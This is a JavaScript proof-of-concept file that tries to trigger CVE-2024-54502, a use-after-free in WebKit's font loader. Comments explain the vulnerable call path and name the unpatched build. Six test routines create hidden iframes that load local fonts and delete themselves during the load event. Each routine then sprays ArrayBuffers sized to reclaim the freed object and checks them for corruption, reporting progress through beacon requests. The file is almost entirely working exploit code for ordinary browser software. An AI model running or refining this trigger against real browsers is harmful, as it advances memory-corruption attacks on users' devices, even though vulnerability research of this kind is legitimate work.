// p229 — CVE-2024-54502 precise re-entrancy trigger
//
// The actual vulnerability path (from WebKit commit ad3a1e, 2025-01-10):
//   fontLoadingTimerFired() → loadPendingFonts() → loadDone() → checkLoadComplete()
//   checkLoadComplete fires the window 'load' event SYNCHRONOUSLY
//   If the load handler destroys the document (iframe self-removal),
//   the DocumentFontLoader is freed while the callback is still on the stack.
//
// Fix was: RefPtr<DocumentFontLoader> at callback start + forward ref-counting to Document
// WebKit-1200 (Dec 2023) does NOT have this fix (fix is Jan 2025)
//
// Trigger: iframe whose ONLY pending subresource is a local @font-face.
//   When the font loads → fontLoadingTimerFired → checkLoadComplete → load event
//   → iframe self-removes via parent.document.body.removeChild(frameElement) → UAF
//
// DocumentFontLoader: FastMalloc, ~80-128 bytes
// Beacon prefix: V230-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V230-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // ---- TEST A: Self-destructing iframe via frameElement ----
  // The iframe's load event fires during checkLoadComplete
  // The handler removes the iframe from the parent DOM → Document freed
  try {
    BS('A-START');

    var aFrame = document.createElement('iframe');
    aFrame.id = 'a-frame';
    aFrame.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(aFrame);

    var aDoc = aFrame.contentDocument;
    aDoc.open();
    // The iframe loads ONE local font as its only subresource
    // When fontLoadingTimerFired fires:
    //   loadPendingFonts → loadDone → checkLoadComplete → fires 'load'
    //   load handler: self-removes iframe → Document freed → UAF
    aDoc.write('<!DOCTYPE html><html><head>');
    aDoc.write('<style>@font-face { font-family: "SelfDestruct"; src: local("Helvetica"), local("Arial"), local("sans-serif"); }</style>');
    aDoc.write('</head><body style="font-family:SelfDestruct">X');
    aDoc.write('<script>');
    aDoc.write('window.addEventListener("load", function() {');
    aDoc.write('  try {');
    aDoc.write('    var xhr = new XMLHttpRequest();');
    aDoc.write('    xhr.open("GET", "' + BASE + '/beacon/V230-A-LOAD-FIRING?t=" + Date.now(), false);');
    aDoc.write('    xhr.send();');
    aDoc.write('  } catch(e) {}');
    aDoc.write('  try {');
    aDoc.write('    parent.document.body.removeChild(frameElement);');
    aDoc.write('  } catch(e) {');
    aDoc.write('    try {');
    aDoc.write('      var xhr2 = new XMLHttpRequest();');
    aDoc.write('      xhr2.open("GET", "' + BASE + '/beacon/V230-A-REMOVE-ERR-" + e.message.substring(0,30) + "?t=" + Date.now(), false);');
    aDoc.write('      xhr2.send();');
    aDoc.write('    } catch(x) {}');
    aDoc.write('  }');
    aDoc.write('});');
    aDoc.write('<\/script>');
    aDoc.write('</body></html>');
    aDoc.close();
    BS('A-IFRAME-WRITTEN');

    // Wait and spray after the iframe self-destructs
    setTimeout(function() {
      BS('A-100MS');

      // If iframe was removed, spray to reclaim DocumentFontLoader
      if (!document.getElementById('a-frame')) {
        BS('A-FRAME-GONE');
      }

      var aSpray = [];
      var sizes = [64, 80, 96, 112, 128, 144, 160, 192];
      for (var si = 0; si < sizes.length; si++) {
        for (var s = 0; s < 400; s++) {
          var ab = new ArrayBuffer(sizes[si]);
          var v = new Uint32Array(ab);
          for (var k = 0; k < v.length; k++) {
            v[k] = 0xA1A10000 | ((si << 12) | (k & 0xFFF));
          }
          aSpray.push(ab);
        }
      }
      BS('A-SPRAYED-' + aSpray.length);

      setTimeout(function() {
        BS('A-SURVIVED');

        // Check spray for non-zero writes from UAF
        var nz = 0;
        for (var i = 0; i < aSpray.length; i++) {
          var view = new Uint32Array(aSpray[i]);
          for (var k = 0; k < view.length; k++) {
            var expected = 0xA1A10000 | ((Math.floor(i / 400) << 12) | (k & 0xFFF));
            if (view[k] !== expected) {
              nz++;
              if (nz <= 10) {
                BS('A-CORRUPT-' + i + '-' + k + '-' + (view[k] >>> 0).toString(16));
              }
            }
          }
        }
        BS('A-NONCORRUPT-' + (nz === 0 ? 'CLEAN' : nz));
        aSpray = null;
      }, 200);
    }, 100);
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Self-destruct via location.replace (softer than removeChild) ----
  try {
    BS('B-START');

    var bFrame = document.createElement('iframe');
    bFrame.id = 'b-frame';
    bFrame.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(bFrame);

    var bDoc = bFrame.contentDocument;
    bDoc.open();
    bDoc.write('<!DOCTYPE html><html><head>');
    bDoc.write('<style>@font-face { font-family: "NavFont"; src: local("Courier"), local("monospace"), local("serif"); }</style>');
    bDoc.write('</head><body style="font-family:NavFont">Y');
    bDoc.write('<script>');
    // On load, navigate away — this replaces the Document
    // The old Document (with its DocumentFontLoader) should be freed
    bDoc.write('window.addEventListener("load", function() {');
    bDoc.write('  try {');
    bDoc.write('    var xhr = new XMLHttpRequest();');
    bDoc.write('    xhr.open("GET", "' + BASE + '/beacon/V230-B-LOAD-FIRING?t=" + Date.now(), false);');
    bDoc.write('    xhr.send();');
    bDoc.write('  } catch(e) {}');
    bDoc.write('  location.replace("about:blank");');
    bDoc.write('});');
    bDoc.write('<\/script>');
    bDoc.write('</body></html>');
    bDoc.close();
    BS('B-IFRAME-WRITTEN');

    setTimeout(function() {
      BS('B-100MS');
      // Spray after navigation
      var bSpray = [];
      for (var si = 0; si < 8; si++) {
        var sz = 64 + si * 16;
        for (var s = 0; s < 400; s++) {
          var ab = new ArrayBuffer(sz);
          var v = new Uint32Array(ab);
          for (var k = 0; k < v.length; k++) {
            v[k] = 0xB1B10000 | ((si << 12) | (k & 0xFFF));
          }
          bSpray.push(ab);
        }
      }
      BS('B-SPRAYED');

      setTimeout(function() {
        BS('B-SURVIVED');
        bSpray = null;
        if (bFrame.parentNode) bFrame.parentNode.removeChild(bFrame);
      }, 200);
    }, 100);
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: Batch iframe self-destruct (increase race window) ----
  try {
    BS('C-START');

    var COUNT = 16;
    var cFrames = [];

    for (var ci = 0; ci < COUNT; ci++) {
      var cf = document.createElement('iframe');
      cf.className = 'c-frame';
      cf.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(cf);
      cFrames.push(cf);

      var cd = cf.contentDocument;
      cd.open();
      cd.write('<!DOCTYPE html><html><head>');
      cd.write('<style>@font-face { font-family: "CF' + ci + '"; src: local("Helvetica"), local("Arial"); }</style>');
      cd.write('</head><body style="font-family:CF' + ci + '">Z');
      cd.write('<script>');
      cd.write('window.addEventListener("load", function() {');
      cd.write('  try {');
      cd.write('    var xhr = new XMLHttpRequest();');
      cd.write('    xhr.open("GET", "' + BASE + '/beacon/V230-C-LOAD-' + ci + '?t=" + Date.now(), false);');
      cd.write('    xhr.send();');
      cd.write('  } catch(e) {}');
      cd.write('  try { parent.document.body.removeChild(frameElement); } catch(e) {}');
      cd.write('});');
      cd.write('<\/script>');
      cd.write('</body></html>');
      cd.close();
    }

    BS('C-IFRAMES-' + COUNT);

    setTimeout(function() {
      // Check how many self-destructed
      var remaining = document.querySelectorAll('.c-frame').length;
      BS('C-REMAINING-' + remaining);

      // Spray
      var cSpray = [];
      for (var s = 0; s < 3000; s++) {
        var ab = new ArrayBuffer(112);
        var v = new Uint32Array(ab);
        for (var k = 0; k < v.length; k++) {
          v[k] = 0xC1C10000 | (k & 0xFFFF);
        }
        cSpray.push(ab);
      }
      BS('C-SPRAYED');

      setTimeout(function() {
        BS('C-SURVIVED');
        cSpray = null;
        // Cleanup any remaining
        cFrames.forEach(function(f) { if (f.parentNode) f.parentNode.removeChild(f); });
      }, 300);
    }, 200);
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST D: loadDone path — font as last subresource ----
  // Ensure font is the ONLY pending load so loadDone transition matters
  try {
    BS('D-START');

    var dFrame = document.createElement('iframe');
    dFrame.id = 'd-frame';
    dFrame.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(dFrame);

    // Use srcdoc to avoid network load for the HTML itself
    dFrame.srcdoc = '<!DOCTYPE html><html><head>' +
      '<style>@font-face { font-family: "DFont"; src: local("Times"), local("serif"); }</style>' +
      '</head><body style="font-family:DFont">D' +
      '<script>' +
      'window.addEventListener("load", function() {' +
      '  try {' +
      '    var xhr = new XMLHttpRequest();' +
      '    xhr.open("GET", "' + BASE + '/beacon/V230-D-LOAD-FIRE?t=" + Date.now(), false);' +
      '    xhr.send();' +
      '  } catch(e) {}' +
      '  try { parent.document.body.removeChild(frameElement); } catch(e) {}' +
      '});' +
      '<\/script>' +
      '</body></html>';

    BS('D-SRCDOC');

    setTimeout(function() {
      BS('D-200MS');
      if (!document.getElementById('d-frame')) {
        BS('D-FRAME-GONE');
      }

      // Spray
      var dSpray = [];
      for (var s = 0; s < 2000; s++) {
        var ab = new ArrayBuffer(96);
        var v = new Uint32Array(ab);
        for (var k = 0; k < v.length; k++) v[k] = 0xD1D10000 | k;
        dSpray.push(ab);
      }
      BS('D-SPRAYED');

      setTimeout(function() {
        BS('D-SURVIVED');
        dSpray = null;
        var df = document.getElementById('d-frame');
        if (df) df.parentNode.removeChild(df);
      }, 200);
    }, 200);
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST E: FontFace API in iframe + self-destruct ----
  try {
    BS('E-START');

    var eFrame = document.createElement('iframe');
    eFrame.id = 'e-frame';
    eFrame.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(eFrame);

    var eDoc = eFrame.contentDocument;
    eDoc.open();
    eDoc.write('<!DOCTYPE html><html><head></head><body>');
    eDoc.write('<script>');
    // Use FontFace constructor + load to trigger beginLoadingFontSoon
    eDoc.write('try {');
    eDoc.write('  var f = new FontFace("EF", "local(Helvetica)");');
    eDoc.write('  document.fonts.add(f);');
    eDoc.write('  f.load().then(function() {');
    eDoc.write('    try {');
    eDoc.write('      var xhr = new XMLHttpRequest();');
    eDoc.write('      xhr.open("GET", "' + BASE + '/beacon/V230-E-FONT-LOADED?t=" + Date.now(), false);');
    eDoc.write('      xhr.send();');
    eDoc.write('    } catch(e) {}');
    // Font loaded → now self-destruct (document still in font-loading state machine)
    eDoc.write('    try { parent.document.body.removeChild(frameElement); } catch(e) {}');
    eDoc.write('  });');
    eDoc.write('} catch(e) {');
    eDoc.write('  try {');
    eDoc.write('    var xhr = new XMLHttpRequest();');
    eDoc.write('    xhr.open("GET", "' + BASE + '/beacon/V230-E-ERR-" + e.message.substring(0,30) + "?t=" + Date.now(), false);');
    eDoc.write('    xhr.send();');
    eDoc.write('  } catch(x) {}');
    eDoc.write('}');
    eDoc.write('<\/script>');
    eDoc.write('</body></html>');
    eDoc.close();

    BS('E-IFRAME-WRITTEN');

    setTimeout(function() {
      BS('E-200MS');
      if (!document.getElementById('e-frame')) BS('E-FRAME-GONE');

      var eSpray = [];
      for (var s = 0; s < 2000; s++) {
        var ab = new ArrayBuffer(128);
        var v = new Uint32Array(ab);
        for (var k = 0; k < v.length; k++) v[k] = 0xE1E10000 | k;
        eSpray.push(ab);
      }
      BS('E-SPRAYED');

      setTimeout(function() {
        BS('E-SURVIVED');
        eSpray = null;
        var ef = document.getElementById('e-frame');
        if (ef) ef.parentNode.removeChild(ef);
      }, 200);
    }, 200);
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST F: Multiple concurrent font loads + batch self-destruct ----
  try {
    BS('F-START');

    var BATCH = 8;
    var fFrames = [];

    for (var fi = 0; fi < BATCH; fi++) {
      var ff = document.createElement('iframe');
      ff.id = 'f-frame-' + fi;
      ff.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(ff);
      fFrames.push(ff);

      // Each iframe loads MULTIPLE fonts to increase timer activity
      var fd = ff.contentDocument;
      fd.open();
      fd.write('<!DOCTYPE html><html><head>');
      for (var fj = 0; fj < 10; fj++) {
        fd.write('<style>@font-face { font-family: "FF' + fi + '_' + fj + '"; src: local("Helvetica"), local("Arial"), local("Courier"); }</style>');
      }
      fd.write('</head><body>');
      for (var fj = 0; fj < 10; fj++) {
        fd.write('<span style="font-family:FF' + fi + '_' + fj + '">F</span>');
      }
      fd.write('<script>');
      fd.write('window.addEventListener("load", function() {');
      fd.write('  try {');
      fd.write('    var xhr = new XMLHttpRequest();');
      fd.write('    xhr.open("GET", "' + BASE + '/beacon/V230-F-LOAD-' + fi + '?t=" + Date.now(), false);');
      fd.write('    xhr.send();');
      fd.write('  } catch(e) {}');
      fd.write('  try { parent.document.body.removeChild(frameElement); } catch(e) {}');
      fd.write('});');
      fd.write('<\/script>');
      fd.write('</body></html>');
      fd.close();
    }

    BS('F-BATCH-' + BATCH);

    setTimeout(function() {
      var fRemaining = 0;
      for (var fi = 0; fi < BATCH; fi++) {
        if (document.getElementById('f-frame-' + fi)) fRemaining++;
      }
      BS('F-REMAINING-' + fRemaining);

      // Spray
      var fSpray = [];
      for (var s = 0; s < 3000; s++) {
        var ab = new ArrayBuffer(112);
        var v = new Uint32Array(ab);
        for (var k = 0; k < v.length; k++) v[k] = 0xF1F10000 | k;
        fSpray.push(ab);
      }
      BS('F-SPRAYED');

      setTimeout(function() {
        BS('F-SURVIVED');
        fSpray = null;
        fFrames.forEach(function(f) { if (f.parentNode) f.parentNode.removeChild(f); });
      }, 300);
    }, 300);
  } catch (e) {
    BS('F-ERR-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
